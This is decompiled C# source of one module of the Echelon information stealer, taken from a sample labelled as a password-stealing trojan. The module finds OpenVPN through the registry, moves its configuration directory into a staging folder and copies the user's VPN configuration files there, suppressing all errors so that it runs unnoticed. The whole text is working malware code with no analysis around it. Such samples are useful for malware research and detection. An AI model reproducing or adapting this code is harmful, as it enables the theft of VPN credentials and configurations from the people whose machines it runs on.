// Decompiled with JetBrains decompiler
// Type: Echelon.OpenVPN
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using Microsoft.Win32;
using System.IO;

namespace Echelon
{
  internal class OpenVPN
  {
    public static int count;

    public static void Start(string Echelon_Dir)
    {
      try
      {
        RegistryKey localMachine = Registry.LocalMachine;
        foreach (string subKeyName in localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames())
        {
          if (subKeyName == nameof (OpenVPN))
          {
            Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN");
            try
            {
              new DirectoryInfo(localMachine.OpenSubKey("SOFTWARE").OpenSubKey(nameof (OpenVPN)).GetValue("config_dir").ToString()).MoveTo(Echelon_Dir + "\\VPN\\OpenVPN");
              ++OpenVPN.count;
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      try
      {
        foreach (FileInfo file in new DirectoryInfo(Help.UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles())
        {
          Directory.CreateDirectory(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\");
          file.CopyTo(Echelon_Dir + "\\VPN\\OpenVPN\\config\\conf\\" + file.Name);
        }
        ++OpenVPN.count;
      }
      catch
      {
      }
    }
  }
}
